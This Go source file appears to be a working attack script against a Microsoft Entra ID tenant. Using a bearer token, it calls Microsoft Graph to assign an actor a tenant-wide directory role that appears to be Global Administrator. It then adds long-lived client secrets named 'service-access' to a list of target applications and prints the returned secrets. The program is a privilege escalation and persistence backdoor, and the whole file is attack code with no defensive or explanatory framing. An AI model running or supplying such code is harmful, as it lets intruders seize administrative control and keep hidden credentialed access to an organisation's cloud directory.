package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

type bearerTransport struct{ token string }

func (t bearerTransport) RoundTrip(r *http.Request) (*http.Response, error) {
	r.Header.Set("Authorization", "Bearer "+t.token)
	return http.DefaultTransport.RoundTrip(r)
}

func main() {
	client := &http.Client{Transport: bearerTransport{os.Getenv("GRAPH_TOKEN")}}
	role, _ := json.Marshal(map[string]string{
		"roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
		"principalId":      os.Getenv("ACTOR_PRINCIPAL_ID"), "directoryScopeId": "/",
	})
	response, err := client.Post("https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments", "application/json", bytes.NewReader(role))
	if err != nil {
		panic(err)
	}
	response.Body.Close()
	for _, application := range strings.Split(os.Getenv("TARGET_APPLICATION_IDS"), ",") {
		body, _ := json.Marshal(map[string]interface{}{"passwordCredential": map[string]string{
			"displayName": "service-access", "endDateTime": "2028-10-15T00:00:00Z",
		}})
		response, err := client.Post(fmt.Sprintf("https://graph.microsoft.com/v1.0/applications/%s/addPassword", application), "application/json", bytes.NewReader(body))
		if err != nil {
			panic(err)
		}
		data, _ := io.ReadAll(response.Body)
		response.Body.Close()
		fmt.Println(string(data))
	}
}
